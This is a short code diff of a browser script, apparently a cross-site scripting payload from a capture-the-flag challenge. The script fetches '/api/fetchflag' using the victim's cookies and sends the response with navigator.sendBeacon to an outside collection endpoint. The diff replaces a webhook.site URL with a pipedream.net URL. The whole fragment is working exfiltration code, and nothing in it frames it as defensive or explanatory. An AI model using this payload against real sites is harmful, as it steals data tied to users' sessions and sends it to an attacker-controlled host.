@@ -6,10 +6,7 @@
 fetch('/api/fetchflag', {credentials: 'include'})
 .then(r => r.text())
 .then(d => {
-  navigator.sendBeacon(
-    "https://webhook.site/d424e8a3-11b3-4ece-a53d-dc80a5cc995b",
-    d
-  );
+  navigator.sendBeacon("https://eofvdc4qg9ln8yd.m.pipedream.net", d);
 });
 </script>
 
